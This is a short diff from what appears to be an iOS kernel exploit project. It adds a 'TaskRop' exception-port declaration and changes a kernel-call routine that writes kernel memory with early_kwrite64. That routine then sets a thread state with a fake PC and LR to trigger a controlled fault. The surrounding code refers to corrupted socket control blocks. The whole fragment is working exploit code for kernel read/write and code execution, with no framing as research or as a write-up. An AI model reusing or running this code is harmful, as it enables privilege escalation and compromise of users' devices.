@@ -45,7 +45,9 @@ extern kern_return_t mach_vm_deallocate(vm_map_read_t target_task, mach_vm_addre
 
 #import "exploit/kexploit_opa334.h" // darksword_*_socket_pcb() (corrupted inpcb VAs) for the zone route
 #import "exploit/kutils.h"          // proc_self() — direct own-proc VA, no allproc walk
-#import "exploit/offsets.h"         // off_proc_ro_pr_task / off_task_map
+#import "exploit/offsets.h"
+// TaskRop: exception port API
+extern kern_return_t thread_set_exception_port(thread_act_t thread, exception_mask_t exception_mask, mach_port_t port);         // off_proc_ro_pr_task / off_task_map
 
 static BOOL kpLooksLikeKernelPointer(uint64_t v)
 {
@@ -2459,10 +2461,10 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                         uint64_t o0 = early_kread64(oVA);
                                         early_kwrite64(oVA, o0 | 0x8000ULL);
                                         // state с FAKE_PC — вызовет fault
-                                        kp_arm_thread_state64_internal st;
+                                        arm_thread_state64_t st;
                                         memset(&st, 0, sizeof(st));
-                                        st.__pc = 0x301;   // FAKE_PC
-                                        st.__lr = 0x401;   // FAKE_LR
+                                        st.__opaque_pc = (void *)(uintptr_t)0x301;   // FAKE_PC
+                                        st.__opaque_lr = (void *)(uintptr_t)0x401;   // FAKE_LR
                                         kern_return_t skr = thread_set_state(hp, ARM_THREAD_STATE64,
                                                                             (thread_state_t)&st, ARM_THREAD_STATE64_COUNT);
                                         kpNote(r, [NSString stringWithFormat:@"  [KCALL] setstate FAKE_PC kr=0x%x", skr]);
